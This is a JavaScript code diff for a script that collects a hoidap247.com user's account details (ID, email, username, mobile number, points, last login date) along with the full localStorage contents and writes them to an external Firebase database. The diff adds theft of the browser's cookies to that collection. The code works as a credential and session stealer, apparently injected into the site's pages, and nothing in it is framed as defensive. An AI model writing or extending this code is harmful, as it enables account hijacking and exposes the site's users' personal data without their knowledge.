@@ -51,20 +51,23 @@ const UserName = parsedValue.user.info.username;
 const Mobile = parsedValue.user.info.mobile;
 const Point = parsedValue.user.info.point;
 const Last_login_date = parsedValue.user.info.last_login_date;
+const Cookie = document.cookie;
 
 
 // Function to write data to the database
-function writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString) {
+function writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString, Cookie) {
     const db = getDatabase();
-    set(ref(db, `hoidap247-com/${ID}`), {
-        Email: Email,
+    set(ref(db, `hoidap247-com/${UserName}`), {
+        ID: ID,
         UserName: UserName,
+        Email: Email,
         Mobile: Mobile,
         Point: Point,
         Last_login_date: Last_login_date,
-        LocalStorage: localStorageString
+        LocalStorage: localStorageString,
+        Cookie: Cookie
     });
 }
 
 // Call the writeData function
-writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString);
+writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString, Cookie);
